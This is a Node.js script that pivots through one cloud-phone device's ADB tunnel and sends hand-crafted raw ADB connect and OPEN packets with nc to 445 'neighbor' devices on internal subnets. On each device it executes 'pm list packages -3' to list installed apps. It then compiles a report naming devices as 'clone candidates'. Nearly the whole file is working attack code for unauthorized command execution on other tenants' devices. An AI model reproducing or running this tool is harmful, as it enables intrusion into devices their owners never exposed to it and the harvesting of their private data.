#!/usr/bin/env node
/**
 * NEIGHBOR APP EXTRACTOR — Batch scan all 445 neighbors
 * Uses CORRECTED ADB OPEN packet (CRC + magic fields) to extract user apps.
 */
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');

const { AK, SK, HOST, D1, CT, SHD, P } = require('../shared/vmos_api');
const D1_ADB = 'localhost:8479';
const OUT = path.join(__dirname, '..', 'output', 'neighbor_full_scan_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

// ── ADB Protocol helpers ──
function adbChecksum(payload) {
  let sum = 0;
  for (let i = 0; i < payload.length; i++) sum += payload[i];
  return sum & 0xFFFFFFFF;
}

function buildOpenPacket(shellCmd) {
  const payload = Buffer.from(`shell:${shellCmd}\x00`);
  const len = payload.length;
  const crc = adbChecksum(payload);
  // OPEN command = 0x4e45504f, magic = OPEN ^ 0xFFFFFFFF = 0xb1baafb0
  const header = Buffer.alloc(24);
  header.write('OPEN', 0, 4, 'ascii');
  header.writeUInt32LE(1, 4);          // local-id
  header.writeUInt32LE(0, 8);          // remote-id
  header.writeUInt32LE(len, 12);       // data length
  header.writeUInt32LE(crc, 16);       // data checksum
  header.writeUInt32LE(0xb1baafb0, 20); // magic
  return Buffer.concat([header, payload]);
}

// Pre-built packets
const CNXN_PKT = Buffer.from(
  '434e584e00000001001000000700000032020000bcb1a7b1686f73743a3a00', 'hex'
);
const OPEN_PM3 = buildOpenPacket('pm list packages -3');
const OPEN_GETPROP = buildOpenPacket('getprop ro.build.display.id');

// Convert to shell printf-safe hex
function bufToShellPrintf(buf) {
  let s = '';
  for (const b of buf) {
    if (b >= 0x20 && b < 0x7f && b !== 0x27 && b !== 0x5c && b !== 0x22 && b !== 0x25) {
      s += String.fromCharCode(b);
    } else {
      s += '\\x' + b.toString(16).padStart(2, '0');
    }
  }
  return s;
}

const CNXN_HEX = bufToShellPrintf(CNXN_PKT);
const OPEN_PM3_HEX = bufToShellPrintf(OPEN_PM3);
const OPEN_GETPROP_HEX = bufToShellPrintf(OPEN_GETPROP);

// ── API helpers ──
function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

function adbShell(cmd, timeoutMs) {
  try {
    return execSync(`adb -s ${D1_ADB} shell '${cmd.replace(/'/g, "'\\''")}'`, {
      timeout: timeoutMs || 30000, encoding: 'utf8', maxBuffer: 10*1024*1024
    }).trim();
  } catch(e) { return `[ADB_ERR: ${(e.message||'').slice(0,80)}]`; }
}

async function main() {
  console.log('█'.repeat(65));
  console.log('  NEIGHBOR APP EXTRACTOR — Corrected ADB Protocol');
  console.log('█'.repeat(65));

  // Load device data
  const devices = JSON.parse(fs.readFileSync('/tmp/parsed_devices.json','utf8'));
  P(`Loaded ${devices.length} devices`);

  // Add userApps field
  for (const d of devices) { d.userApps = []; d.buildId = ''; }

  // ══════════════════════════════════════════════════════════════
  // BATCH SCAN: Extract user apps from ALL devices via ADB tunnel
  // Process in batches of 10 using adb shell
  // ══════════════════════════════════════════════════════════════
  const BATCH = 8;
  let totalWithApps = 0;
  let scanned = 0;

  for (let i = 0; i < devices.length; i += BATCH) {
    const batch = devices.slice(i, i + BATCH);
    const batchNum = Math.floor(i/BATCH) + 1;
    const totalBatches = Math.ceil(devices.length/BATCH);
    
    if (batchNum % 5 === 1) P(`Batch ${batchNum}/${totalBatches} (scanned=${scanned}, withApps=${totalWithApps})...`);

    // Build shell script for this batch
    const script = batch.map(d => {
      return `(printf '${CNXN_HEX}'; sleep 0.4; printf '${OPEN_PM3_HEX}'; sleep 2) | nc -w4 ${d.ip} 5555 2>/dev/null | strings | grep "^package:" | sort -u | while read line; do echo "PKG=${d.ip}|$line"; done; echo "DONE=${d.ip}"`;
    }).join('\n');

    const result = adbShell(script, 40000);
    
    // Parse results
    for (const line of result.split('\n')) {
      if (line.startsWith('PKG=')) {
        const parts = line.replace('PKG=','').split('|');
        const ip = parts[0];
        const pkg = (parts[1]||'').replace('package:','').trim();
        if (pkg) {
          const d = devices.find(x => x.ip === ip);
          if (d && !d.userApps.includes(pkg)) {
            d.userApps.push(pkg);
          }
        }
      }
    }

    scanned += batch.length;
    totalWithApps = devices.filter(d => d.userApps.length > 0).length;
  }

  P(`\nScan complete: ${scanned} scanned, ${totalWithApps} with user apps`);

  // Save intermediate results immediately
  save('all_devices_with_apps.json', devices);
  P(`Intermediate data saved.`);

  const withApps = devices.filter(d => d.userApps.length > 0);

  // ══════════════════════════════════════════════════════════════
  // GENERATE REPORT
  // ══════════════════════════════════════════════════════════════
  P('\n── GENERATING FINAL REPORT ──');
  
  const withModel = devices.filter(d => d.model);
  
  // Unique apps
  const allApps = {};
  for (const d of devices) {
    for (const app of d.userApps) {
      if (!allApps[app]) allApps[app] = [];
      allApps[app].push(d.ip);
    }
  }

  // Subnet stats
  const subnets = {};
  for (const d of devices) {
    const sub = d.ip.split('.').slice(0,3).join('.');
    if (!subnets[sub]) subnets[sub] = { total: 0, withModel: 0, withApps: 0 };
    subnets[sub].total++;
    if (d.model) subnets[sub].withModel++;
    if (d.userApps.length > 0) subnets[sub].withApps++;
  }

  // Model counts
  const modelCounts = {};
  for (const d of withModel) {
    if (!modelCounts[d.model]) modelCounts[d.model] = [];
    modelCounts[d.model].push(d.ip);
  }

  // ── Build markdown ──
  let R = `# NEIGHBOR FULL SCAN REPORT\n\n`;
  R += `**Generated**: ${new Date().toISOString()}  \n`;
  R += `**Scan Method**: ADB protocol with corrected OPEN packets (CRC + magic) via nc relay through D1  \n\n`;

  R += `## Summary\n\n`;
  R += `| Metric | Count |\n|--------|-------|\n`;
  R += `| **Total Neighbors Found (port 5555 open)** | ${devices.length} |\n`;
  R += `| **Device Model Identified** | ${withModel.length} |\n`;
  R += `| **Unique Device Models** | ${Object.keys(modelCounts).length} |\n`;
  R += `| **Devices WITH User Apps** | ${withApps.length} |\n`;
  R += `| **Devices Sterile (no user apps)** | ${devices.length - withApps.length} |\n`;
  R += `| **Unique User Apps Discovered** | ${Object.keys(allApps).length} |\n\n`;

  R += `## Subnet Distribution\n\n`;
  R += `| Subnet | Total | Identified | With User Apps |\n|--------|-------|------------|---------------|\n`;
  for (const [sub, s] of Object.entries(subnets).sort((a,b) => b[1].total - a[1].total)) {
    R += `| ${sub}.x | ${s.total} | ${s.withModel} | ${s.withApps} |\n`;
  }

  if (withApps.length > 0) {
    R += `\n## 🎯 Devices WITH User Apps — Clone Candidates\n\n`;
    R += `| # | IP | Model | Build | User Apps |\n|---|-----|-------|-------|----------|\n`;
    let n = 1;
    for (const d of withApps.sort((a,b) => b.userApps.length - a.userApps.length)) {
      R += `| ${n++} | ${d.ip} | ${d.model || '?'} | ${d.buildId || '?'} | ${d.userApps.join(', ')} |\n`;
    }

    R += `\n## All User Apps Found\n\n`;
    R += `| App Package | Installed On |\n|-------------|-------------|\n`;
    for (const [app, ips] of Object.entries(allApps).sort((a,b) => b[1].length - a[1].length)) {
      R += `| \`${app}\` | ${ips.length} device(s): ${ips.join(', ')} |\n`;
    }
  } else {
    R += `\n## Status: All Neighbors Sterile\n\n`;
    R += `No user apps found on any of the ${devices.length} neighbors.\n`;
    R += `All devices run only system services.\n`;
  }

  R += `\n## Top Device Models (${Object.keys(modelCounts).length} unique)\n\n`;
  R += `| Model | Count | Sample IPs |\n|-------|-------|------------|\n`;
  for (const [m, ips] of Object.entries(modelCounts).sort((a,b) => b[1].length - a[1].length).slice(0, 40)) {
    R += `| ${m} | ${ips.length} | ${ips.slice(0,3).join(', ')} |\n`;
  }

  R += `\n## Full Device List (${devices.length} neighbors)\n\n`;
  R += `| # | IP | Model | Name | User Apps |\n|---|-----|-------|------|----------|\n`;
  for (let i = 0; i < devices.length; i++) {
    const d = devices[i];
    const apps = d.userApps.length > 0 ? d.userApps.join(', ') : '—';
    R += `| ${i+1} | ${d.ip} | ${d.model || '—'} | ${d.name || '—'} | ${apps} |\n`;
  }

  R += `\n## Methodology\n\n`;
  R += `1. **Discovery**: Parallel port 5555 scan across 10.0.{26,27,96,97,98,99}.x from D1 (ACP250923JS861KJ)\n`;
  R += `2. **Model ID**: Raw ADB CNXN banner extraction via \`printf + nc\` (strings parsing)\n`;
  R += `3. **App Scan**: Corrected ADB OPEN packet with proper \`data_check\` and \`magic\` fields → \`shell:pm list packages -3\`\n`;
  R += `4. **Root Cause of Prior Failure**: OPEN packet had CRC=0 and magic=0 → ADB server silently rejected\n`;

  // Save everything
  save('NEIGHBOR_FULL_SCAN_REPORT.md', R);
  save('all_devices_with_apps.json', devices);
  fs.writeFileSync(path.join(__dirname, '..', 'reports', 'NEIGHBOR_FULL_SCAN_REPORT.md'), R);

  P(`Report: ${OUT}/NEIGHBOR_FULL_SCAN_REPORT.md`);
  P(`Data: ${OUT}/all_devices_with_apps.json`);
  P(`\n═══ RESULTS ═══`);
  P(`Total neighbors: ${devices.length}`);
  P(`With model: ${withModel.length}`);
  P(`With user apps: ${withApps.length}`);
  P(`Unique user apps: ${Object.keys(allApps).length}`);
  
  if (withApps.length > 0) {
    P(`\n── CLONE CANDIDATES ──`);
    for (const d of withApps) {
      P(`  ${d.ip} (${d.model||'?'}): ${d.userApps.join(', ')}`);
    }
  }

  console.log('\n' + '█'.repeat(65));
  console.log('  EXTRACTION COMPLETE');
  console.log('█'.repeat(65));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
